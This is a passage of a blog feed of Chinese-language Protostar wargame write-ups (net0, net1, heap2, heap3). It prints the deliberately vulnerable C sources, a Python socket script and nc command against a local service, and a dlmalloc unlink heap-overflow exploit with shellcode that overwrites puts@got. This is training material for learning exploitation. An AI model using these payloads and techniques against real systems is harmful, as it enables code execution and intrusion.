&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you didn't send the data properly\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2998</span>))</span><br><span class="line"></span><br><span class="line">n = s.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] n:"</span> + n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] repr(n):"</span> + repr(n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Hex:"</span> + n.encode(<span class="string">'hex'</span>)</span><br><span class="line">N = struct.unpack(<span class="string">"I"</span>,n)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] N:"</span></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line">s.send(str(N))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv:"</span> + s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net1_1.jpg" data-fancybox="group" data-caption="net1_1" class="fancybox"><img alt="net1_1" title="net1_1" data-src="https://dblu3.github.io/img/Protostar/net1_1.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net1&quot;&gt;&lt;a href=&quot;#Net1&quot; class=&quot;headerlink&quot; title=&quot;Net1&quot;&gt;&lt;/a&gt;Net1&lt;/h1&gt;&lt;p&gt;Net1: convert binary integers into ascii&lt;br&gt;跟net0没太大差别，直接写个脚本就行了&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net0</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net0/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net0/</id>
    <published>2018-09-18T06:44:37.000Z</published>
    <updated>2018-09-18T07:57:27.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net0"><a href="#Net0" class="headerlink" title="Net0"></a>Net0</h1><p>Net0: convert strings to little endian integers</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2999</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = <span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please send '%d' as a little endian 32bit int\n"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fread(&amp;i, <span class="keyword">sizeof</span>(i), <span class="number">1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(i == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Thank you sir/madam\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"I'm sorry, you sent %d instead\n"</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查看net0运行状态"><a href="#查看net0运行状态" class="headerlink" title="查看net0运行状态"></a>查看net0运行状态</h2><p>切换到root:godmode查看net0的端口<br><a href="https://dblu3.github.io/img/Protostar/net0_1.jpg" data-fancybox="group" data-caption="net0_1" class="fancybox"><img alt="net0_1" title="net0_1" data-src="https://dblu3.github.io/img/Protostar/net0_1.jpg" class="lazyload"></a></p><h2 id="监听net0"><a href="#监听net0" class="headerlink" title="监听net0"></a>监听net0</h2><p>提示我们应该输入little endian 32bit int的数据<br><a href="https://dblu3.github.io/img/Protostar/net0_2.jpg" data-fancybox="group" data-caption="net0_2" class="fancybox"><img alt="net0_2" title="net0_2" data-src="https://dblu3.github.io/img/Protostar/net0_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>使用<code>cat -</code>将输入的内容重定向到输出<br><a href="https://dblu3.github.io/img/Protostar/net0_3.jpg" data-fancybox="group" data-caption="net0_3" class="fancybox"><img alt="net0_3" title="net0_3" data-src="https://dblu3.github.io/img/Protostar/net0_3.jpg" class="lazyload"></a></p><p>用python的struct模块转换一下<br><a href="https://dblu3.github.io/img/Protostar/net0_4.jpg" data-fancybox="group" data-caption="net0_4" class="fancybox"><img alt="net0_4" title="net0_4" data-src="https://dblu3.github.io/img/Protostar/net0_4.jpg" class="lazyload"></a></p><p>输入后记得使用<code>CTRL+D</code>完成输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin# echo -e &quot;&#96;cat - &#96;&quot; | nc 127.0.0.1 2999</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net0_5.jpg" data-fancybox="group" data-caption="net0_5" class="fancybox"><img alt="net0_5" title="net0_5" data-src="https://dblu3.github.io/img/Protostar/net0_5.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net0&quot;&gt;&lt;a href=&quot;#Net0&quot; class=&quot;headerlink&quot; title=&quot;Net0&quot;&gt;&lt;/a&gt;Net0&lt;/h1&gt;&lt;p&gt;Net0: convert strings to little endian integers&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap3</title>
    <link href="http://yoursite.com/2018/09/16/Protostar-heap3/"/>
    <id>http://yoursite.com/2018/09/16/Protostar-heap3/</id>
    <published>2018-09-16T13:51:17.000Z</published>
    <updated>2018-09-17T17:25:12.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap3"><a href="#Heap3" class="headerlink" title="Heap3"></a>Heap3</h1><p>Heap3：dlmalloc(Doug Lea Malloc)的unlink漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="dlmalloc"><a href="#dlmalloc" class="headerlink" title="dlmalloc"></a>dlmalloc</h2><p>dlmalloc是通过块管理的，结构体头部如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> prev_size;<span class="comment">// 上一个块的大小</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;<span class="comment">// 最重要的是最后1位，它表示上一个块是否空闲(空闲时为0)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">fd</span>;</span><span class="comment">// 前一个块的指针，当前块空闲时有效</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">bk</span>;</span><span class="comment">// 后一个块的指针，当前块空闲时有效</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>通过上一个buffer把prev_size和size都设为-4(\xfc\xff\xff\xff)之后，触发unlink</p><p>这里稍微解释一下为什么(\xfc\xff\xff\xff)是-4，其实通过计算就很容易发现了</p><p>0xffff fffc + 0x6 = 0x1 0000 0002 多出来的1溢出了，所以相当于0x6-0x4=0x2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unlink(p, bck, fwd)</span><br><span class="line">&#123;</span><br><span class="line">    bck = p-&gt;bk;  <span class="comment">// winner()</span></span><br><span class="line">    fwd = p-&gt;fd;  <span class="comment">// puts@got - 12</span></span><br><span class="line"></span><br><span class="line">    fwd-&gt;bk = bck;  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">fwd + 12 = puts@got =&gt; winner()</span></span><br><span class="line"><span class="comment">执行到此处程序会崩溃，所以可以把winner()改成shellcode</span></span><br><span class="line"><span class="comment">fwd + 12 = puts@got =&gt; shellcode地址 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    bck-&gt;fd = fwd;  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">bck + 8 = winner() + 8 = puts@got - 12 </span></span><br><span class="line"><span class="comment">相应的：shellcode地址 + 8 = puts@got - 12 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>分别在malloc()、srtcpy()、free()、printf()处下断点<br><a href="https://dblu3.github.io/img/Protostar/heap3_1.jpg" data-fancybox="group" data-caption="heap3_1" class="fancybox"><img alt="heap3_1" title="heap3_1" data-src="https://dblu3.github.io/img/Protostar/heap3_1.jpg" class="lazyload"></a></p><p>运行并找到heap地址<br><a href="https://dblu3.github.io/img/Protostar/heap3_2.jpg" data-fancybox="group" data-caption="heap3_2" class="fancybox"><img alt="heap3_2" title="heap3_2" data-src="https://dblu3.github.io/img/Protostar/heap3_2.jpg" class="lazyload"></a></p><p>找到a的buffer地址:0x804c008<br><a href="https://dblu3.github.io/img/Protostar/heap3_3.jpg" data-fancybox="group" data-caption="heap3_3" class="fancybox"><img alt="heap3_3" title="heap3_3" data-src="https://dblu3.github.io/img/Protostar/heap3_3.jpg" class="lazyload"></a></p><h2 id="winner-地址"><a href="#winner-地址" class="headerlink" title="winner()地址"></a>winner()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap3_4.jpg" data-fancybox="group" data-caption="heap3_4" class="fancybox"><img alt="heap3_4" title="heap3_4" data-src="https://dblu3.github.io/img/Protostar/heap3_4.jpg" class="lazyload"></a></p><h2 id="执行winner-的shellcode"><a href="#执行winner-的shellcode" class="headerlink" title="执行winner()的shellcode"></a>执行winner()的shellcode</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x08048864</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div><p>对应的shellcode是<code>\x68\x64\x88\x04\x08\xc3</code></p><h2 id="puts-got的地址"><a href="#puts-got的地址" class="headerlink" title="puts@got的地址"></a>puts@got的地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap3_5.jpg" data-fancybox="group" data-caption="heap3_5" class="fancybox"><img alt="heap3_5" title="heap3_5" data-src="https://dblu3.github.io/img/Protostar/heap3_5.jpg" class="lazyload"></a></p><h2 id="shellcode地址"><a href="#shellcode地址" class="headerlink" title="shellcode地址"></a>shellcode地址</h2><p>0x804b128-0xc(12)=0x804b11c</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>payload: 12个字节的nop + 6个字节的shellcode + 14个字节的填充(a的buffer: 12+6+14=32个字节) + 2个“\xfc\xff\xff\xff” + 4个字节填充(p-(-4)=p+4) + shellcode地址(puts@got的地址-12) + a的buffer地址 + 任意字符(补充第3个参数)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap3 &#96;python -c &#39;print &quot;\x90&quot;*12 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*14 + &quot;\xfc\xff\xff\xff&quot;*2&#39;&#96;  &#96;python -c print&#39; &quot;BBBB&quot; + &quot;\x1c\xb1\x04\x08&quot; + &quot;\x08\xc0\x04\x08&quot;&#39;&#96; CCCC</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap3_6.jpg" data-fancybox="group" data-caption="heap3_6" class="fancybox"><img alt="heap3_6" title="heap3_6" data-src="https://dblu3.github.io/img/Protostar/heap3_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap3&quot;&gt;&lt;a href=&quot;#Heap3&quot; class=&quot;headerlink&quot; title=&quot;Heap3&quot;&gt;&lt;/a&gt;Heap3&lt;/h1&gt;&lt;p&gt;Heap3：dlmalloc(Doug Lea Malloc)的unlink漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap2</title>
    <link href="http://yoursite.com/2018/09/15/Protostar-heap2/"/>
    <id>http://yoursite.com/2018/09/15/Protostar-heap2/</id>
    <published>2018-09-15T13:33:08.000Z</published>
    <updated>2018-09-16T13:50:32.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap2"><a href="#Heap2" class="headerlink" title="Heap2"></a>Heap2</h1><p>Heap2: Use-After-Free(UAF)</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">int</span> auth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> *<span class="title">auth</span>;</span></span><br><span class="line"><span class="keyword">char</span> *service;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[ auth = %p, service = %p ]\n"</span>, auth, service);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">line</span> + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, <span class="built_in">line</span> + <span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"reset"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">free</span>(auth);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"service"</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          service = strdup(<span class="built_in">line</span> + <span class="number">7</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"login"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(auth-&gt;auth) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"you have logged in already!\n"</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"please enter your password\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>查看heap的内存地址</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_1.jpg" data-fancybox="group" data-caption="heap2_1" class="fancybox"><img alt="heap2_1" title="heap2_1" data-src="https://dblu3.github.io/img/Protostar/heap2_1.jpg" class="lazyload"></a></p><p>找到printf的地址</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_2.jpg" data-fancybox="group" data-caption="heap2_2" class="fancybox"><img alt="heap2_2" title="heap2_2" data-src="https://dblu3.github.io/img/Protostar/heap2_2.jpg" class="lazyload"></a></p><p>在printf处下断点,设置command</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_3.jpg" data-fancybox="group" data-caption="heap2_3" class="fancybox"><img alt="heap2_3" title="heap2_3" data-src="https://dblu3.github.io/img/Protostar/heap2_3.jpg" class="lazyload"></a></p><p>输入<code>auth admin</code> </p><p>name处确实有admin字样，但auth的值仍为0</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_4.jpg" data-fancybox="group" data-caption="heap2_4" class="fancybox"><img alt="heap2_4" title="heap2_4" data-src="https://dblu3.github.io/img/Protostar/heap2_4.jpg" class="lazyload"></a></p><p>尝试输入数据到heap中，auth的值突变</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_5.jpg" data-fancybox="group" data-caption="heap2_5" class="fancybox"><img alt="heap2_5" title="heap2_5" data-src="https://dblu3.github.io/img/Protostar/heap2_5.jpg" class="lazyload"></a></p><h2 id="关于auth变量的命名"><a href="#关于auth变量的命名" class="headerlink" title="关于auth变量的命名"></a>关于auth变量的命名</h2><p>当程序运行到<code>auth = malloc(sizeof(auth));</code>会计算变量的大小</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 